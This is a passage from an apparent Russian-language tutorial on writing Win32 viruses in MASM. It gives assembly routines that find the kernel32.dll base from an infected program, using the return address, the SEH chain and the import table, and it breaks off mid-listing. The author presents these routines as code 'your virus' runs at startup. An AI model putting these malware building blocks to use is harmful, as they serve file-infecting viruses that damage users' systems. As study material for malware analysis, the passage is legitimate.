<p>Теперь вопрос о том, сколько страниц проверять и когда останавливаться. Размер исполняемого образа <strong>kernel32.dll</strong> в <strong>Windows XP SP2</strong> около 1 Мб. Мы не знаем, где находиться сама процедура <strong>CreateProcess</strong> или <strong>UnhandledExceptionFilter</strong>. Но она точно содержится в секции кода <strong>PE</strong>-файла. Можно проанализировать PE-заголовок и выяснить начало секции кода и ее размер. Но это избыточные меры. В каждой ОС семейства <strong>Windows</strong>, как показывает проведенное тестирование, база находиться без счетчика. Я тестировал свою программу на ОС <strong>Windows 95,98,ME,2000,XP</strong>. Предлагаю Вам табличку с базами:</p>
<table summary="Базы">
<tr><th>ОС</th><th>База kernel32.dll</th></tr>
<tr><td>Windows XP SP1</td><td>77E60000H</td></tr>
<tr><td>Windows XP SP2</td><td>7C000000H</td></tr>
<tr><td>Windows 2000 SP4</td><td>79430000H</td></tr>
</table>
<p>Можно полагаться на результаты тестирования. Но я ввожу счетчик, лишь для того, чтобы сделать процедуру универсальной.</p>
<p>Вот исходный код процедуры для получения базы:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;============================================================</span><br/>
<span style="color: black; font-style: italic;">;Процедура GetBase</span><br/>
<span style="color: black; font-style: italic;">;Поиск базы исполняемого файла, если есть адрес где-то внутри него</span><br/>
<span style="color: black; font-style: italic;">;Вход: В esi - адрес внутри файла в памяти</span><br/>
<span style="color: black; font-style: italic;">;Выход:В eax - база PE-файла</span><br/>
<span style="color: black; font-style: italic;">;Заметки:обычно процедура используется с спроецируемыми файлами в память</span><br/>
<span style="color: black; font-style: italic;">;============================================================</span><br/>
GetBase proc<br/>
&nbsp; &nbsp; &nbsp; &nbsp; LOCAL &nbsp; Base<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;чтобы не изменять контекст по договоренности</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;сохраняем все регистры, которые используются</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pushf</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;сохраняем регистр флагов</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0FFFF0000H</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;гранулярность выделения памяти</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">6</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;счетчик страниц</span><br/>
NextPage<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;проверка очередной страницы</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; ValidPE<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #ff0000;">1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; Base<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popf</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>Base<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10000H</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">loop</span>&nbsp; &nbsp; NextPage<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popf</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;восстанавливаем значения флагов</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;восстанавливаем значения регистров</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>FALSE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;не нашли базу :(</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
GetBase endp<br/>
<span style="color: black; font-style: italic;">;============================================================</span><br/>
<span style="color: black; font-style: italic;">;Конец процедуры GetBase</span><br/>
<span style="color: black; font-style: italic;">;============================================================</span><br/>
&nbsp;</div>
<h3><a name="c16"></a>Способы получения адреса в kernel32.dll</h3>
<p>В этом разделе будут рассмотрены способы получения адреса в памяти внутри спроецированной <strong>DLL</strong>.</p>
<h4><a name="c161"></a>Способ 1: Адрес возврата</h4>
<p>Посмотрите такой пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #ff0000;">.386</span><br/>
option casemap<span style="color: #339933;">:</span>none<br/>
<span style="color: #339933;">.</span>model <span style="color: #0000ff; font-weight: bold;">flat</span><span style="color: #339933;">,</span>stdcall<br/>
<span style="color: black; font-style: italic;">;----------------------IncludeLib and Include-----------------------</span><br/>
includelib f<span style="color: #339933;">:</span>\tools\masm32\lib\kernel32<span style="color: #339933;">.</span>lib<br/>
include f<span style="color: #339933;">:</span>\tools\masm32\include\kernel32<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span><br/>
<span style="color: black; font-style: italic;">;--------------------End IncludeLib and Include---------------------</span><br/>
<span style="color: #0000ff; font-weight: bold;">.data</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span><br/>
<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br/>
<span style="color: #0000ff; font-weight: bold;">start</span><span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;берем из стека значение и записываем его в eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; invoke&nbsp; ExitProcess<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
end &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">start</span><br/>
&nbsp;</div>
<p>Что, по Вашему, поместиться в регистр
<strong>eax</strong>? Как операционная система создает процесс? Правильно, с помощью функции <strong>CreateProcess</strong>. <strong>CreateProcess</strong> находиться где-то внутри <strong>kernel32.dll</strong>. Т.о. в <strong>eax</strong> мы получаем адрес где-то внутри <strong>kernel32.dll</strong>. Когда запускается зараженный файл, то управление передается вирусу. Вот тут-то мы и сцапаем нужный адрес. Но это естественно надо cделать сразу при запуске программы, а то стек забьется какими-нибудь данными или адресами возврата. Вот код, который должен выполнить Ваш вирус для получения базы <strong>kernel32.dll</strong> с помощью данного способа:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #0000ff; font-weight: bold;">start</span><span style="color: #339933;">:</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;начало тела вируса</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; GetBase &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;после вызова в eax - база kernel32.dll</span><br/>
&nbsp;</div>
<p>Просто, не правда ли?</p>
<h4><a name="c162"></a>Способ 2: SEH</h4>
<p><strong>SEH</strong> расшифровывается как <strong>Structured Exception Handling</strong>. По-русски - Структурная Обработка Исключения (СОИ). Вы узнаете о <strong>SEH</strong> все в соответствующей части данной книги. Здесь я только приведу способ, как получить адрес в kernel32.dll используя <strong>SEH</strong>. Кажется навороченно, да? Но на самом деле это достаточно просто. По адресу FS:0 находиться структура, которая называется <strong>TIB</strong>(<strong>Thread Information Block</strong>). Перый <strong>DWORD</strong> <strong>TIB</strong>'а указывает на структуру которую называют <strong>ERR</strong>. Вот как она выглядит:</p>
<table summary="">
<tr><th>1ый dword</th><td>Указатель на следующую ERR структуру</td></tr>
<tr><th>2ой dword</th><td>Указатель на обработчик исключения</td></tr>
</table>
<p>Т.о. формируется связный список. Как узнать где заканчивается связный список? Если это последний элемент списка, то 1ый <strong>DWORD</strong> имеет значение -1. Операционная система при создании процесса сама устанавливает обработчик, чтобы, если что, выдать на экран <strong>MessageBox</strong> с сообщением об ошибке. Если это последний элемент в цепочке структур <strong>ERR</strong>, то указатель на обработчик исключения будет находиться где-то в <strong>kernel32.dll</strong>. Важно где именно. Этот адрес не будет совпадать с функцией <strong>UnhandledExceptionFilter</strong>. Это можно проверить практически. На самом деле это стандартный обработчик ОС <strong>Windows</strong>. Вот процедура, которая демонстрирует эту технику:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;============================================================</span><br/>
<span style="color: black; font-style: italic;">;Процедура GetKernelSEH</span><br/>
<span style="color: black; font-style: italic;">;Поиск адрес внутри kernel32.dll</span><br/>
<span style="color: black; font-style: italic;">;Вход: ничего</span><br/>
<span style="color: black; font-style: italic;">;Выход:В eax - адрес внутри kernel32.dll</span><br/>
<span style="color: black; font-style: italic;">;============================================================</span><br/>
GetKernelSEH&nbsp; &nbsp; proc<br/>
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">fs</span><span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">flat</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;для масма обязательно. По умолчанию assume fs:err</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: #46aa03; font-weight: bold;">fs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">0</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;в eax - указатель на структуру ERR</span><br/>
NextElem<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><span style="color: #339933;">,-</span><span style="color: #ff0000;">1</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;последний элемент</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; Yes<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; NextElem<br/>
Yes<span style="color: #339933;">:</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;если пришли к последнему элементу</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">+</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
GetKernelSEH&nbsp; &nbsp; endp<br/>
<span style="color: black; font-style: italic;">;============================================================</span><br/>
<span style="color: black; font-style: italic;">;Конец процедуры GetKernelSEH</span><br/>
<span style="color: black; font-style: italic;">;============================================================</span><br/>
&nbsp;</div>
<p>После получения адреса внутри kernel32.dll вызываем функцию <strong>GetBase</strong>, передавая ей соответствующие параметры для получения базы.</p>
<h4><a name="c163"></a>Способ 3: Таблица импорта</h4>
<p>Этот способ отличается от приведенных выше. При загрузке <strong>PE</strong>-файла в память загрузчик заполняет адреса соответствующих функций из соответствующих <strong>DLL</strong>, которые нужны программе. Т.е. эти адреса хранятся внутри <strong>PE</strong>-файла, когда он загружен. Нам необходимо получить адрес любой функции из <strong>kernel32.dll.</strong></p>
<p>В таблице импорта есть два массива адресов. Один не изменяется. В нем содержаться сразу адреса импортируемых функций. Это применимо, в частности, для системных <strong>DLL</strong>. Второй массив заполняется при загрузке <strong>PE</strong>-файла. Чтобы найти базу <strong>kernel32.dll</strong> надо найти таблицу импорта. В таблице импорта найти второй массив адресов. Массивы называются <strong>IMAGE_THUNK_DATA</strong> и описаны в <strong>WINNT.H</strong>. Первый массив называется <strong>OriginalFirstFunk</strong>, второй <strong>FirstThunk</strong>. Точнее так называются указатели на них, определенные в WINNT.H. Вам надо хорошо разбираться в импорте PE-файлов, чтобы понять это. Сначала мы должны найти начало зараженного файла. Потом переходим к PE заголовку. Далее проходим до <strong>IMAGE_DATA_DIRECTORY</strong>. Переходим к элементу с индексом 1. Элемент с индексом 1 соответствует таблице импорта <strong>PE</strong>-файла. Сохраняем <strong>RVA</strong> и складываем его с базой нашего <strong>EXE</strong>. По найденному адресу находятся структуры <strong>IMAGE_IMPORT_DESCRIPTOR</strong>. В этой структуре есть элемент - указатель на имя импортируемой <strong>DLL</strong>. Проверяем не <strong>kernel32.dll</strong> ли это, если нет, то идет к следующей структуре <strong>IMAGE_IMPORT_DESCRIPTOR</strong>. Если это <strong>kernel32.dll</strong>, то идем по указателю <strong>FirstThunk</strong>. Он указывает на таблицу адресов импорта или по-другому <strong>IMAGE_THUNK_DATA</strong>. Эта таблица переписывается загрузчиком PE-файла при загрузке. Вы можете подумать, что можно из таблицы импорта сразу взять адрес функции <strong>GetProcAddress</strong>. Но не факт что она будет там, так как сам <strong>EXE</strong>-файл может не импортировать функцию. Вот код который выуживает адрес одной из функций библиотеки <strong>kernel32.dll</strong>:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;============================================================</span><br/>
<span style="color: black; font-style: italic;">;Процедура GetKernelImport</span><br/>
<span style="color: black; font-style: italic;">;Поиск адреса внутри kernel32.dll</span><br/>
<span style="color: black; font-style: italic;">;Вход: ничего</span><br/>
<span style="color: black; font-style: italic;">;Выход:В eax - адрес внутри kernel32.dll</span><br/>
<span style="color: black; font-style: italic;">;============================================================</span><br/>
GetKernelImport proc<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; x<br/>
x<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;в esi - смещение данной команды</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;выравниваем стек</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0FFFF0000h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;используем гранулярность</span><br/>
y<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; ValidPE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;начало EXE-файла?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #ff0000;">0</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;если нет, то ищем дальше</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #ff0000;">010000h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; y<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;в ebx теперь будем хранить базу</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">:</span>ptr IMAGE_DOS_HEADER<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>e_lfanew&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;в esi - заголовок PE</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">:</span>ptr IMAGE_NT_HEADERS<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>OptionalHeader&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;в esi - адрес опционального заголовка</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">:</span>ptr IMAGE_OPTIONAL_HEADER<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>DataDirectory &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;в esi - адрес DataDirectory</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;в esi - элемент 1 в DataDirectory</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;в eax - смещение таблицы импорта</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">:</span>ptr IMAGE_IMPORT_DESCRIPTOR<br/>
NextDLL<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>Name1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
